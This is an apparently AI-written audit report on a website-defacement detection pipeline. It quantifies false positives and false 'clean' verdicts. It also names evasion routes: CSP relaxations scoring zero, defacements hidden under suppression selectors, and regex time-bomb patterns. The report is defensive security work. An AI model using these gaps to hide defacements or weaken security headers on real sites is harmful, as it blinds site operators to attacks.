# PROMPT-003 — Session A, Subagent 2: Detection Pipeline Deep Verification

- **Prompt**: `PROMPT-003-capture-detection-audit-and-stress-hardening.md` (Session A, subagent 2 of 5)
- **Date**: 2026-09-30
- **Assigned scope**: Audit Phase 2 (detection traceability) + Phase 4 (detection fresh-eyes), plus every cross-reference from AUDIT-1-1, AUDIT-2-1..6, AUDIT-4-1..8, AUDIT-4F-5.
- **Rule 1 compliance**: **zero production files modified.** `git status --porcelain` shows only untracked additions; `git diff --stat HEAD` is empty. No git state-changing command was run.
- **Environment**: Windows host; Docker stack up but **not used for any measurement** (every finding below is hermetic — all probes ran in-process against `backend/.venv\Scripts\python.exe`, synthetic HTML + synthetic PNG screenshots + one real-Chromium render pass). Disposable test Postgres `wardress-test-pg` on `127.0.0.1:5433`; every pytest invocation used `$env:WARDRESS_TEST_DATABASE_URL = "postgresql+asyncpg://wardress:wardress@127.0.0.1:5433/wardress_sa_detect_test"`.
- **Scratch probes** (Rule 10, outside the repo): `C:\Users\Ns8pc\AppData\Local\Temp\opencode\wardress-session-a\detection\probe_fusion_stability.py`, `probe_fusion_stability2.py`, `probe_benign_churn.py`, `probe_layer58_isolation.py`, `probe_layer58_followup.py`, `probe_suppress_layer346.py`, `probe4.py`, `probe5.py`, `probe6_realrender.py`, `probe7.py`, `probe8.py`.

---

## Headline: what Session A found that the original phases structurally could not

Three of the findings below are **false "clean"/false-positive-1.0 outcomes on shapes that are either extremely common benign behaviour or a standard attack prerequisite**, and each one is reproducible end-to-end through `run_detection` with 3/3 zero-variance passes. The single most important measurement of this session is:

> **The committed 646-row training dataset contains 36 BENIGN rows that fuse to ≥ 0.40, and 34 of those exceed the default 0.50 flag threshold. The `vendor_script_added` axis alone averages 0.7538 (max 0.8269).** The `regression_corpus.json` guard that supposedly protects against this contains **zero** of those shapes (0 benign rows cross 0.40), because Phase 12 made the corpus a strict subset of the same generator family that *dropped* the two benign axes that matter.

That converts AUDIT-2-4 ("no generalization test") from an unproven risk into a **measured, artifact-verified alert rate**, and it is the mechanism behind the reCAPTCHA finding.

---

## Findings

### [DEEPENED] AUDIT-1-1 — "changed, not clean" is real, but the logged cause is the *minor* part; the byte-hash gate is not what makes the verdict noisy
- **Original phase:** Audit Phase 1 (and re-verified in Phase 2)
- **Severity:** Medium (downgraded from the Phase-1 "High" with justification below; the *real* driver of operator-visible noise is AUDIT-SA2-1/2, not the l1 byte flip)
- **Subsystem / file(s):** `backend/worker/scan_tasks.py:304-308` (the `changed` gate), `backend/worker/detection/fusion.py` (risk computation), `backend/app/scanning.py:58` (`MATERIAL_CHANGE_RISK = 0.40`)
- **Verification method:** code-trace + measurement (3 passes/shape, 11 benign shapes) + the measured single-layer reachability map
- **Evidence:**
  - The gate is exactly as logged: `changed = any((r.get("score") or 0.0) > NOISE_FLOOR for k, r in results.items() if k != "layer9_fusion" and not r.get("skipped"))`, `NOISE_FLOOR = 0.02` (`scan_tasks.py:59`). `layer1_hash` is a non-skipped 1.0 on any byte difference. **CONFIRMED.**
  - **Quantification of benign churn (Rule 18, 3 passes each, pstdev 0.00000 on every shape):** a clean, well-behaved 14-article page under eleven out-of-family benign churn shapes fuses to **0.1907 – 0.2213**, verdict `changed`, never `clean`. Shapes and numbers: editorial 1-paragraph rewrite 0.1953; rotating ad `<img>` 0.1982; reCAPTCHA iframe `src` rotate 0.2000; canvas ticker `data-frame` 0.1997; live clock text 0.1967; lazy infinite-scroll append (+8 articles) 0.2213; webfont swap 0.2041; live like-counter digits 0.1967; CSRF-token rotate 0.2121; HTML-comment + `<noscript>` churn 0.1997.
  - **The byte-hash is only ~0.137 of that.** Measured with `layer1_hash` alone: `sigmoid(4.408 − 6.247) = 0.1372`. So the *floor* for any byte-changing scan is 0.137, and the noise floor to 0.22 comes from the content layers' residual churn terms. Excluding l1 from `changed` would move benign sites from `changed` to… still `changed` (layer2/layer3 residuals are 0.007–0.15). **The Phase-1 remedy ("exclude the raw byte-hash when all content layers are sub-noise") would NOT deliver `clean`.**
  - The only shape that *does* read `clean` is a truly byte-identical pair (identical render: risk 0.0029, `clean`).
- **Deeper analysis:** Phase 1's framing ("benign dynamic content reads changed because the byte hash participates in the gate") is technically true but **causally incomplete**. The measured benign band is 0.19–0.22 and the byte hash is 0.137 of it; the remaining 0.06–0.08 is layer 2's content-churn term and layer 3's `min(0.4, 0.02 × total_new_refs)` churn term, both of which are *designed* to read non-zero on real content churn. There is no layer-score configuration at which an 8-article lazy-append (layer2 = 0.1231) reads `clean` — its only defence is that 0.1231 < the 0.40 material bar, which is a *cadence* defence, not a verdict defence. **Remedy design must change:** either the verdict needs a third state ("changed-benign" / "byte-churn only") or `changed` must be gated on the *content* peak specifically excluding l1 and the generic churn term, with a stated tolerance for the churn term.
- **Cross-subsystem interactions:** the frontend (`site-detail.tsx` verdict badge, `incident-timeline.tsx`) has no representation for this third state; `app/explain.py` receives the full layer evidence so the LLM can already narrate it; `AUDIT-4B-3`'s cadence coupling is unaffected (it consumes `risk`, not `changed`).

---

### [DEEPENED] AUDIT-2-4 — CONFIRMED AND QUANTIFIED: `MATERIAL_CHANGE_RISK` is overfitted, and the artifact itself carries 34 benign rows above the default flag threshold
- **Original phase:** Audit Phase 2, directive 3
- **Severity:** **High** — per §6.4, "a false positive that would alert operators on legitimate, common site behavior" is the explicit High clause. Not Critical: the attack side is unaffected.
- **Subsystem / file(s):** `backend/worker/detection/training/fusion_dataset.json` (646 rows), `backend/worker/detection/training/regression_corpus.json` (152 rows), `backend/worker/detection/fusion.py:62-71, 182-186`, `backend/tools/build_fusion_dataset.py`, `backend/tools/build_regression_corpus.py`
- **Verification method:** measurement (every committed row re-fused through the **deployed** `layer9_fusion`)
- **Evidence — the 646-row dataset (the model was FITTED on these exact rows):**
  ```
  BENIGN rows: 323 | risk >= 0.40 (MATERIAL_CHANGE_RISK): 36 | risk >= 0.50 (default flag): 34
    risk=0.8454 site_redesign-0002          (l1=1.0, l2=0.376, l8=0.718)   split=val
    risk=0.8427 site_redesign-0014          (l1=1.0, l2=0.312, l8=0.733)   split=train
    risk=0.8269 vendor_script_added-00NN    (l1=1.0, l2=0.877, l3=0.933)   train/val/test
  per-axis benign fused-risk max:
    vendor_script_added     max=0.8269  mean=0.7538   <<< 100% of this axis's rows flag
    sanity_benign_quiet     max=0.6583
    site_redesign           max=0.8454  mean=0.3723
    editorial_update        max=0.3706  mean=0.1877
    ab_test_variant         max=0.3588  mean=0.1539
    benign_ua_variation     max=0.0019
    theme_hue_refresh       max=0.0222
    rotating_ad             max=0.1404
    timestamp_counter       max=0.1372
    cache_busting_refs     max=0.1491
    minor_css_churn         max=0.1513
    mixed_noise_combo       max=0.1610
    nonnative_editorial     max=0.2495
    cert_header_rotation    max=0.0048
  ```
  **`vendor_script_added` is a benign axis whose every row the fitted model scores ≥ 0.5.** That is the concrete, measured content of the `fusion.py` module docstring's admission ("the coarse eight-dimensional feature space cannot separate some profiles — notably 'operator added third-party scripts' from 'attacker injected scripts' — the measured vectors collide"). The caveat exists; the *number* was never stated.
- **Evidence — the 152-row corpus is clean, which is the circularity:** `corpus BENIGN rows crossing 0.40: 0  crossing 0.50: 0`. Its benign axes are `rotating_ad, timestamp_counter, cache_busting_refs, minor_css_churn, mixed_noise_combo, editorial_update, nonnative_editorial` — **none of `vendor_script_added`, `site_redesign`, `sanity_benign_quiet`, `ab_test_variant`, `cert_header_rotation`, `benign_ua_variation`, `theme_hue_refresh`**. So the standing guard `test_benign_dynamic_rows_stay_below_the_material_change_band` re-checks the 7 axes that are safe and is blind to the 7 that are not.
- **Evidence — the 3 out-of-family benign pairs the kickoff mandated (my measurement, 3 passes each, 3/3 identical):** see AUDIT-SA2-1. A Google reCAPTCHA / Cloudflare Turnstile / Taboola widget **flags at 0.6776**; that shape's layer vector (`l1=1.0, l2=0.5034, l3=0.5934, l4=0.0161`) is the same vector as `vendor_script_added`'s `l1=1.0, l2=0.877, l3=0.933`.
- **Deeper analysis:** the overfitting is not merely "no out-of-distribution test exists" (Phase 2's framing) — **the calibration data itself contains the false-positive population and the guard omits it.** Phase 12's decision to make the corpus a strict subset of the dataset axes removed exactly the two benign axes (`vendor_script_added`, `site_redesign`) that would have exposed this. `sanity_benign_quiet` at 0.6583 is a *sanity row* — a row whose entire purpose was to prove the harness is calibrated — and it is above the flag threshold. That is a strong signal the 0.40 bar was set from a different feature scale than the one the refit produced.
- **Cross-subsystem interactions:** every benign vendor-addition on a monitored site now creates an `Alert` row + `RemediationExecution` rows (via `_create_alert`/`_create_remediations` at `scan_tasks.py:353-362`) and permanently tightens cadence to `base//4`. `should_escalate` is skipped (risk > 0.75 for most of these) so the LLM second opinion is *not* consulted — the false positive is unmitigated by design.

---

### [DEEPENED] AUDIT-4-1 — CONFIRMED and the blast radius is far larger than logged: a one-word edit can reach **risk 1.0 / `flagged`** via the rule floor
- **Original phase:** Audit Phase 4
- **Severity:** **Critical** (kept; the log graded Critical and the reproduction is stronger than logged)
- **Subsystem / file(s):** `backend/worker/detection/signatures.py:197-211` (`_new_text`), `backend/worker/detection/semantics.py:120-123, 43-88` (`_new_visible_text`, `_AGGRESSION_LEXICON`, `_TOPIC_KEYWORDS`), `backend/worker/detection/fusion.py:182-186` (rule floors), `backend/worker/scan_tasks.py:309`
- **Verification method:** measurement (3 passes/shape, pstdev 0.00000)
- **Evidence — the granularity collapse is total, not partial. `_new_text == extract_visible_text(current)` verbatim (100.0% of the page) in 7 of 9 adversarial shapes:**
  | shape | `new_text / current_text` | note |
  |---|---|---|
  | punctuated multi-sentence (CONTROL) | 0.8% | correct |
  | unpunctuated, clean | **100.0%** | `new_text == ct.strip()` is `True` |
  | unpunctuated + baseline profanity | **100.0%** | layer5 = 0.25 |
  | only emoji | **100.0%** | |
  | only numbers | **100.0%** | |
  | mixed script, no Latin punctuation | **100.0%** | |
  | CJK without sentence markers | **100.0%** | |
  | very long single-line minified text (51 KB) | **100.0%** | |
  | DOM text returning a single line | **100.0%** | |
- **Evidence — the logged numbers were the *low* end. Measured end-to-end through `run_detection`, 3/3 identical each:**
  | baseline fixture (unpunctuated) | layer5 | layer8 | fused | verdict |
  |---|---|---|---|---|
  | contains `hacked by` / `owned by` / `defaced by` (a security write-up) | **1.0** | 0.0 | **1.0** | **`flagged`**, rule floor `conclusive_signature_text` armed at 0.90 |
  | contains 3 distinct strong profanity terms | **0.6** | 0.0 | **1.0** | **`flagged`** |
  | 2 profanity terms | 0.5 | 0.0 | 0.996 | **`flagged`** |
  | contains `we will be back` / `no one is safe` / `death to` / `regime` / `traitors` | 0.0 | **0.9993** (aggression_weight 6.0) | **1.0** | **`flagged`** |
  | contains `被黑` / `已被入侵` (zh) | 0.0 | **0.9608** | 0.98 | **`flagged`** |
  | security-blog text with `breach`/`compromised`/`database dump`/`leaked credentials` | 0.0 | 0.70 (topic cap) | 0.976 | **`flagged`** |
  | contains `contact us at telegram` / `t.me/…` | 0.0 | 0.35 | 0.947 | **`flagged`** |
  | contains `index.php changed` / `replaced` | 0.0 | 0.35 | 0.947 | **`flagged`** |
  | **CONTROL:** punctuated page, same edit | 0.0 | 0.0 | 0.194 | `changed` |
  The logged AUDIT-4-1 numbers (layer5 0.25, layer8 0.568, fused 0.857) are the *weakest* fixtures; with a realistic lexicon the same one-word edit reaches the rule floor and a certain flag.
- **Deeper analysis — why the blast radius is genuinely fleet-scale:** the two preconditions are (a) the page's `extract_visible_text` has no `[.!?]` sentence boundary, and (b) the baseline carries lexicon vocabulary. Both are *routine* on the live web: (a) is the default for every CJK/Devanagari/Thai page (no Latin sentence punctuation), every canvas- or JS-rendered page, every one-word-per-line page, and every emoji/status feed; (b) is the default for every page that discusses security, hosting, outages, breach news, or user-generated content. The combination is not exotic. Note also `aggression_score = 1 − exp(−1.2 · Σw)` with **no cap** on `Σw` (`semantics.py:277`) — a page with the vocabulary repeated N times saturates layer 8 to 1.0 regardless of page size, whereas `topic_score` *is* capped at 0.7 (`:278`). That asymmetry is why the aggression channel is the one that reaches maximal severity.
- **Cross-subsystem interactions:** every one of these rows produces an `Alert` **and** a `RemediationExecution`; the `_escalation_new_text` prompt handed to the LLM (`scan_tasks.py:66-75`) is built from the **raw, un-normalized, un-suppressed** HTML, so the LLM sees the same whole page as "new" and can independently confirm a defacement that never happened. Frontend `finding-card.tsx`/`scan-detail.tsx` render the flagged badge with no indication the evidence is baseline-present.

---

### [NEW] AUDIT-SA2-1 — A rotating third-party widget (reCAPTCHA / Turnstile / Taboola / analytics / Intercom) **FLAGS** a healthy site at risk 0.6776
- **Severity:** **High** — §6.4's explicit High clause: "a false positive that would alert operators on legitimate, common site behavior". Not Critical: no false-clean, no security impact, detection is not disabled.
- **Subsystem / file(s):** `backend/worker/detection/dom.py:640-676` (`_collect_refs`), `:688-734` (`layer3_link_audit`, `weights` at `:704-710`, `domain_score` at `:727`), `backend/worker/detection/dom.py:518-593` (layer 2), `backend/worker/detection/fusion.py:185` (rule floor)
- **Verification method:** measurement (3 passes/shape, pstdev 0.00000 on every shape)
- **Evidence** — one new external domain on a rotating widget, full `run_detection`, 3/3 identical:
  | benign shape | layer2 | layer3 | fused | verdict | rule floor |
  |---|---|---|---|---|---|
  | Google reCAPTCHA anchor `<iframe>` appears | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | `new_sensitive_infrastructure` |
  | reCAPTCHA `src` rotates between scans (`?k=ab12`) | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | armed |
  | Cloudflare Turnstile widget appears | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | armed |
  | Taboola lazy ad `<iframe>` | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | armed |
  | operator adds an Intercom chat widget | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | armed |
  | operator adds a Segment analytics script | 0.5034 | 0.5934 | **0.6776** | **`flagged`** | armed |
  | operator adds a HubSpot form on a new domain | 0.0226 | 0.5934 | **0.5310** | **`flagged`** | armed |
  | one new external stylesheet (Google Fonts) | 0.0226 | 0.4173 | **0.4243** | `changed` | not armed |
  | two new external stylesheets (Google Fonts + Typekit) | 0.0226 | ~0.93 | **≥0.50** | **`flagged`** | armed |
  | 1×1 tracking pixel on a new domain | 0.0075 | **0.0** | 0.2072 | `changed` | none |
  | **CONTROL:** same iframe, `src` rotates *within a known domain* | 0.0 | 0.02 | 0.19 | `changed` | none |
  | **CONTROL:** HTML comment only | 0.0 | 0.0 | 0.2056 | `changed` | none |
- **Deeper analysis — the root cause is not "new domain", it is "no notion of element identity":** `layer3_link_audit` diffs *sets of URLs* (`c_refs[kind] - b_refs[kind]`). It cannot distinguish "a brand-new `<script>` element appeared" from "an `<iframe>` element that was already on the page now has a different `src`". The reCAPTCHA case is the *second* one — the element is present in the baseline, only its `src` value rotates — and it scores identically (0.5934) to a brand-new third-party injection. A rotating `src` on any `<script>`, `<iframe>`, `<link>` or `<form>` is the single most common benign third-party pattern on the web, and `iframe_src`/`script_src`/`form_action` all carry weight 1.0 while `link_href` carries 0.6 — so a rotating ad-network `<iframe>` is scored at full injection weight. The 0.42–0.68 band sits *right at* the escalation floor and rule floor, so it also arms `new_sensitive_infrastructure` (0.40), putting it in the same bucket as a real script injection.
- **Cross-subsystem interactions:** creates `Alert` + `RemediationExecution` rows; tightens cadence to `base//4` permanently (AUDIT-4B-3); skipped by `should_escalate` (risk > 0.75) so the LLM second opinion never reviews it; and the operator's only remedy is a per-site suppression rule, which — see AUDIT-SA2-4 — is itself a masking vector.

---

### [NEW] AUDIT-SA2-2 — A CSP widening scores **exactly 0.0** and the scan reads **`clean`**
- **Severity:** **Critical** — §6.4's first bullet: "a false 'clean'/'silent success' on an actual attack pattern". CSP removal/weakening is a standard XSS/defacement prerequisite, and it is the *only* thing layer 6 exists to catch.
- **Subsystem / file(s):** `backend/worker/detection/metadata.py:111-172` (`_classify_value_change`, CSP branch `:121-142`), `:215-262` (`_header_diff`), `:281-314` (`layer6_security_metadata`)
- **Verification method:** measurement (unit + end-to-end through `run_detection`)
- **Evidence — the direction classifier returns `None` (direction unknown) for every real-world CSP relaxation, which `_header_diff` files under `security_headers_changed` and never scores:**
  ```
  default-src 'self'            -> default-src *                          -> None   <<< 0.0
  default-src 'self'            -> default-src 'unsafe-inline'            -> None   <<< 0.0
  script-src 'self'             -> script-src 'unsafe-inline'             -> None   <<< 0.0
  script-src 'self'             -> script-src 'unsafe-eval' 'unsafe-inline'-> None   <<< 0.0
  frame-ancestors 'self'        -> frame-ancestors *                      -> None   <<< 0.0
  object-src 'none'             -> object-src 'self'                      -> None   <<< 0.0
  base-uri 'self'               -> base-uri 'none'  (a real HARDENING)    -> None   <<< 0.0 (FN)
  default-src 'self'            -> default-src 'self' https://cdn.evil.tld-> 'stronger'  <<< 0.0 (FP)
  default-src 'self'            -> default-src 'self'                    -> 'equal'   (correct)
  script-src 'self'             -> [script-src DELETED]                   -> 'weaker'  (correct)
  ```
  **Root cause:** `metadata.py:131-137` decides direction by `frozenset` **superset/subset** comparison. `{'*'} >= {'self'}` is `False` and `{'self'} >= {'*'}` is `False` → `unknown = True` → `return None`. Any **token exchange** (one token out, one token in) is undeterminable by this logic — which is *every* realistic CSP relaxation, because relaxing a policy always means replacing a restrictive source with a permissive one.
- **Evidence — end-to-end, three passes, `layer1_hash` identical (0.0), so the ONLY signal is layer 6:**
  ```
  CSP default-src 'self' -> *          l6 = 0.0000   verdict = ('clean', 0.00314)   !!!!
  script-src 'self' -> 'unsafe-inline' l6 = 0.0000   verdict = ('clean', 0.00314)   !!!!
  ```
  **A monitored site whose operator (or an attacker who can reach the web-server config) widens its CSP from `'self'` to `*` is recorded by Wardress as `clean` at risk 0.0031.** That is worse than AUDIT-4-5's empty-capture case because the content genuinely did not change — only the site's security posture collapsed.
- **Evidence — the removal direction still works (positive control, so the gap is specifically the value-change path):** removing 5 security headers → `l6 = 0.8` → `flagged` at 0.6724 (3/3). Removing 4 → `l6 = 0.8` → `flagged` at 0.6724. `script-src` directive *deleted* → correctly `weaker`.
- **Deeper analysis:** the FP direction is arguably worse than the FN. `default-src 'self'` → `default-src 'self' https://cdn.evil.tld` is an **attacker-supplied origin being added to the allowlist** — the textbook CSP-weakening-for-exfil pattern — and the classifier calls it `stronger` (more tokens) and scores 0.0. Meanwhile `base-uri 'self'` → `base-uri 'none'` is a genuine hardening classified `None`. The subset test has no notion of which tokens are *restrictive*, so it cannot distinguish these in either direction.
- **Related, same root: HSTS magnitude is invisible.** `score = min(0.8, 0.3 × removed + 0.1 × weakened)` (`metadata.py:255`) — every weakening is worth the same 0.1. Measured: `max-age=63072000; includeSubDomains; preload` → `max-age=300` (a total HSTS neutralization: 2 years + includeSubDomains + preload → 5 minutes) scores `l6 = 0.1` and fuses to **0.0041**. Dropping only `includeSubDomains`+`preload` also reads `weaker` at 0.1. A severe, trivially-exploitable security regression is essentially invisible to the layer whose module docstring is "security metadata diff … downgrades score as downgrades".
- **Cross-subsystem interactions:** `app/explain.py:98` reads layer-6 evidence headers for the LLM explanation, so the *text* is recorded honestly (`security_headers_changed` with both values) while the *score* is 0.0 — an operator reading the explanation would see the change; an operator reading the verdict would not. `routers/health.py` and the frontend never surface it because the verdict is `clean`.

---

### [DEEPENED] AUDIT-4-2 / AUDIT-4-3 — Both confirmed; the TLS transient is materially worse than logged (it crosses the FLAG threshold, not just the material bar)
- **Original phase:** Audit Phase 4
- **Severity:** **High** for AUDIT-4-2 (confirmed at the logged severity), **Medium** for AUDIT-4-3 (confirmed)
- **Subsystem / file(s):** `backend/worker/detection/metadata.py:175-212` (`_tls_diff`), `:265-278` (`_robots_diff`), `backend/worker/probe.py` (`probe_tls`)
- **Verification method:** measurement (3 passes/scenario, pstdev 0.00000)
- **Evidence — AUDIT-4-2, re-measured with ordinary byte churn present (l1 = 1.0):**
  ```
  identical, healthy                        l6 = 0.0    verdict = changed  risk = 0.2056
  baseline TLS present, CURRENT probe FAILED l6 = 0.6    verdict = FLAGGED  risk = 0.5502  !!!!
  baseline probe failed, current TLS present l6 = 0.0    verdict = changed  risk = 0.2056  (asymmetric forever)
  ```
  The log measured `fused 0.429` (material-bar crossing, escalation band). **With the realistic `layer1_hash = 1.0` that any real scan has, the fused risk is 0.5502 — above the default 0.50 flag threshold**, i.e. a single failed TLS handshake on an otherwise-unchanged site produces an `Alert` + `RemediationExecution`. The log understated this.
  - `robots.txt` half confirmed in both directions: current-side probe failure → 0.15 (`lines_removed: ['Allow: /', 'User-agent: *']`, `current_missing: True`); baseline-side failure → 0.15 (`baseline_missing: True`). Both are probe transients, neither degrades.
  - Cert reissue controls measured: routine same-issuer reissue → 0.1 (risk 0.2511); different issuer → 0.55 (risk 0.5180, `flagged`). Both behave as designed.
- **Evidence — AUDIT-4-3, statically expired cert on BOTH sides:**
  ```
  cert statically EXPIRED on BOTH sides   l6 = 0.5   verdict = changed  risk = 0.4857  esc = True
  cert expired only in current (real transition) l6 = 0.5  verdict = changed  risk = 0.4857
  ```
  The two cases are **indistinguishable in the score**. A permanently-expired certificate (a static property of the site, unchanged for months) therefore produces risk 0.4857 on **every scan forever**, sits permanently in the LLM escalation band (0.40 ≤ 0.4857 < 0.75 → an LLM call per scan), and permanently tightens cadence to `base//4`. This is worse than the logged "risk stays ~0.01" — the log's measurement must have had a different `layer1` profile.
- **Deeper analysis:** the structural issue is the one Phase 3's O-idea identified (structured absence reasons on `probe_site`), now with two measured consequences rather than one. `probe_tls` collapses three distinct facts into `None` (plain-HTTP scheme / handshake failure / transport torn down); `_tls_diff` treats the collapse as a certificate observation. And `_tls_diff` abandons its own compare-baseline-vs-current semantics for exactly one field (`current_tls["expired"]`), which is the only *state* rather than *delta* it scores. The escalation-band consequence is new and material: `should_escalate(0.4857, changed=True)` is `True`, so every scan of a site with an expired cert burns an LLM call. Across a fleet with any statically-expired certs that is a recurring provider cost, and a permanently-pinned `changed` verdict.
- **Cross-subsystem interactions:** `AUDIT-4B-3` (cadence pinned at `base/4`) is the direct consequence for both; `AUDIT-4E-3` (30 s per deployment) is multiplied by the escalation-band residency; the frontend shows a permanent `changed` badge with a layer-6 score of 0.5 that an operator will learn to ignore, degrading trust in the one channel that *does* work (AUDIT-SA2-2).

---

### [DEEPENED] AUDIT-4-4 — CONFIRMED, plus a broader finding: an over-broad suppression rule permanently blinds layers 5 and 8
- **Original phase:** Audit Phase 4
- **Severity:** **High** for the new over-broad-rule finding; **Medium** for the timeout asymmetry (as logged)
- **Subsystem / file(s):** `backend/worker/detection/suppress.py:121-169` (`_apply_to_html`), `:87-118` (`build_suppression`), `backend/worker/detection/pipeline.py:144-150` (suppression runs BEFORE normalization and before every content layer)
- **Verification method:** measurement (3 passes per shape)
- **Evidence — AUDIT-4-4 itself, reproduced with 8 real user-plausible patterns (each 3 passes, base apply / current apply times shown):**
  ```
  '(a|aa)+b|Session id: \d+'   base 1999.6 ms  current 1999.9 ms  unusable=2
  '(a|aa)+b'                  base 1999.3 ms  current 2000.0 ms  unusable=2
  '^(\w+\s?)+$'                 base    0.2 ms  current    0.1 ms  (no timeout - stdlib-safe)
  '([a-zA-Z]+)*!'               base    0.8 ms  (no timeout)
  '(.*,)*[0-9]+'                base    1.5 ms  (no timeout)
  '(\d+)+#'                     base    0.1 ms  (no timeout)
  '\b(\w+\s+){1,20}\bEND\b'      base    0.1 ms  (no timeout)
  'Session id: \d+'             base    0.1 ms  (no timeout)
  '[A-Z]{3,}'                   base    0.1 ms  (no timeout)
  ```
  **Honest correction to my own hypothesis and to the kickoff's:** of the realistic patterns I tested (greedy `.*`, nested quantifiers, backreference-adjacent `(\d+)+#`, catastrophic alternation `(a|aa)+b|Session id: \d+`, bounded repetition), **only the alternation-based time bomb actually times out** — the `regex` module's optimizations defeat `^(\w+\s?)+$`, `([a-zA-Z]+)*!`, `(.*,)*[0-9]+` and `(\d+)+#`. The finding's mechanism (per-side partial application) is real, but the *reusable* trigger is narrower than "any ReDoS-shaped user regex": it needs a pattern the `regex` engine cannot optimize away *and* an input node long enough to blow 2 s. The ReDoS-immunity claim in `suppress.py`'s and `normalize.py`'s docs is therefore **true for `normalize.py` (all patterns linear, max measured 99.9 ms on a 2 MB document) and true for the *common* user patterns, but not absolute** — `(a|aa)+b`-class alternation bombs still cost 2 s per text node.
  - **Cost amplification, measured:** 60 pathological text nodes under one rule → **2.00 s total**, because the `TimeoutError` aborts the whole element loop at the *first* node. So the per-node budget is not additive; the naive worst case (120 s) is not reachable. This partially *contradicts* the logged "a rule that times out only on long nodes can burn nodes×2 s" — with the current code the loop aborts on the first timeout. **The logged root-cause sentence is wrong on that point; the asymmetry half is right.**
  - **Asymmetry confirmed** for the logged pattern with the pathological node FIRST on one side: `removed: baseline=False current=True`, `unusable=2` (one duplicate per side, as logged), and `outputs_equal=False`.
- **Evidence — NEW, and the more serious half: over-broad rules blind layers 5 and 8 permanently, with no coverage signal.** A conclusive defacement (`WE HAVE BEEN HACKED BY THE DRAGON TEAM` + `Your security is weak` + `Contact us at telegram t.me/dragonx`) scores `layer5 = 1.0`, `layer8 = 0.7`, fused 1.0, `flagged` with no suppression. With one rule added, 3 passes each:
  | rule | layer5 | layer8 | fused | verdict |
  |---|---|---|---|---|
  | none | 1.0 | 0.7 | 1.0 | `flagged` |
  | `css_selector #notif` (the injected banner) | 0.0 | 0.0 | 0.1953 | `changed` |
  | `css_selector main` | 0.0 | 0.0 | 0.1953 | `changed` |
  | `css_selector *` | 0.0 | 0.0 | 0.1953 | `changed` |
  | `css_selector body` | 0.0 | 0.0 | 0.1953 | `changed` |
  | `regex .*` | 0.0 | 0.0 | 0.1996 | `changed` |
  | `regex [\s\S]+` | 0.0 | 0.0 | 0.1996 | `changed` |
  | `regex 'hacked by\|hacked\|telegram\|compromised\|security'` | 1.0 | 0.35 | 1.0 | `flagged` |
  | `regex 'Session id: \d+'` (precise) | 1.0 | — | — | `flagged` |
  `build_suppression` accepts `.*`, `[\s\S]+`, `*`, `body`, `main` with **no warning and no size check**. The `suppression_applied` evidence records only *which* rules ran (`{"regexes": [...]}`) — nothing about **how much content they removed**, so an operator (or an auditor) cannot tell that 100% of the page is now invisible to two of nine layers.
- **Deeper analysis / attack model:** suppression runs **before** every content layer and *replaces* the content on both sides (`pipeline.py:145-149` → `suppressed_copy`), so a suppressed span is invisible to layers 2, 3, 5 and 8 entirely. An adversary who can predict or guess a common suppression selector (`#banner`, `.alert`, `aside`, `.notification`, `[role=alert]`, `.cookie-consent`) can place a conclusive defacement inside it and read as ordinary churn. The `main`/`body`/`*` results above are the *accidental* version of the same primitive, reachable by a single plausible user action.
- **Cross-subsystem interactions:** the frontend `suppression-panel.tsx` lets an operator author these rules; nothing warns them. `AUDIT-4F-2` (frontend shows `Clean` for a degraded scan) is the same "the client cannot see what the engine did not measure" class. The API/DB are unaffected.

---

### [DEEPENED] AUDIT-4-5 — CONFIRMED, and the mirror case is worse: a **both-sides** capture failure reads `clean`
- **Original phase:** Audit Phase 4
- **Severity:** **High** (upgraded from the logged Medium with justification: the logged case reads `changed` at 0.4837; the *mirror* case is a false `clean`)
- **Subsystem / file(s):** `backend/worker/detection/dom.py:528-541` (`layer2_dom_structure` parse-differential), `backend/worker/detection/pipeline.py:129-166` (degraded guard, baseline side only), `backend/worker/detection/types.py:75-87` (`degraded_result`)
- **Verification method:** measurement (3 passes/shape)
- **Evidence:**
  | current capture | layer2 | layer8 | fused | verdict | `degraded` |
  |---|---|---|---|---|---|
  | `html = ""` (fetch stored nothing) | **1.0** | 0.0 | **0.4837** | `changed` | none |
  | `html = "   "` | 1.0 | 0.0 | 0.4837 | `changed` | none |
  | `html = "<!-- cf challenge -->"` (comment only) | 1.0 | 0.0 | 0.4837 | `changed` | none |
  | `html = "<html></html>"` (empty shell) | 0.6 | 0.0 | 0.3590 | `changed` | none |
  | `html = "<html><body></body></html>"` | 0.6 | 0.0 | 0.3590 | `changed` | none |
  | 10 MB page that is nothing but a `<script>` | 0.6 | 0.0 | 0.3590 | `changed` | none |
  | **raw binary junk** (`\x00\x01\x02\xff\xfe garbage`) | **1.0** | **0.9738** | **0.9833** | **`flagged`** | none |
  | 6 MB single text node, no tags | 0.6 | 0.9809 | **0.9732** | **`flagged`** | none |
  | **BOTH sides empty** | — | — | **0.0205** | **`clean`** | `layer4_visual_diff` only |
- **Deeper analysis — two new sub-cases the log did not have:**
  1. **A binary/undeclared-content capture FLAGS.** If the fetcher ever stores a non-HTML body (a PDF, a mis-decompressed gzip, a mis-sniffed content type, an image), `parse_html` produces a garbage tree, layer 2 reads it as total structural annihilation (1.0) and layer 8's MiniLM cosine on binary noise reads maximal semantic drift (0.9738) → **risk 0.9833, `flagged`, alert + remediation rows created from a capture bug.** Layer 8's `drift_from_similarity` has no content-type guard and no non-HTML guard.
  2. **A total failure on BOTH sides reads `clean`.** Baseline and current both empty → `content_sha256("")` is identical → `identical = True` → layers 2/3/5/8 get `skip_result` (a *proof of zero*, per the module docstring) → `layer1_hash = 0.0` → `changed = False` → **`clean`** at risk 0.0205. The hash gate's own contract ("byte-identical serialized DOM cannot produce deltas") is *technically* satisfied and *semantically* false here, because the bytes are identical only because there are none. `layer4_visual_diff` does degrade (no screenshots) but `layer2/3/5/8`'s `skip_result` says "proof of zero", and `skip_result` is excluded from `_unmeasured_keys` (`fusion.py:249-259`) by design. So the system's own designed distinction between "provably zero" and "unmeasured" is inverted by an empty-page pair.
